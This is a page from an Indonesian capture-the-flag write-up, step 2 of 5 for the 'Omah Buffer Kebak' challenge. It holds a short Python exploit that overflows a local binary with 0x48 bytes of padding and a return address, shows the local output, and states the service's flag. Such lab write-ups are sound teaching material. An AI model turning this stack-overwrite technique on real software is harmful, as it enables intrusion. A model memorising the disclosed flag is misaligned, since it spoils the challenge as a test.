# Omah Buffer Kebak — Cara mendapatkan flag

[← Overview](64-omah-buffer-kebak.md) · [Index](index.md)

> **Langkah 2/5.** Padding `0x48` byte lalu alamat `obong`. Diuji lokal.
>
> **Berikutnya:** [Flag](64-omah-buffer-kebak-03-flag.md)

```python
import struct, subprocess
win = 0x40125f
payload = b"A" * 0x48 + struct.pack("<Q", win) + b"\n"
print(subprocess.check_output(["./peserta/omah"], input=payload).decode())
```

Output lokal:

```text
Halo, AAAA...
FLAG: TESTFLAG
```

Di service, `flag.txt` berisi `NFX{OmahhKUuD0Ndoll_Uw0nggG}`.

### Evidence langkah ini

![00b-terminal-evidence.png](assets/omah-buffer-kebak/00b-terminal-evidence.png)

*Terminal evidence (arsip/log asli) — `00b-terminal-evidence.png`.*

**Berkas mentah terkait:**

- [`01-solve.txt`](assets/omah-buffer-kebak/01-solve.txt)
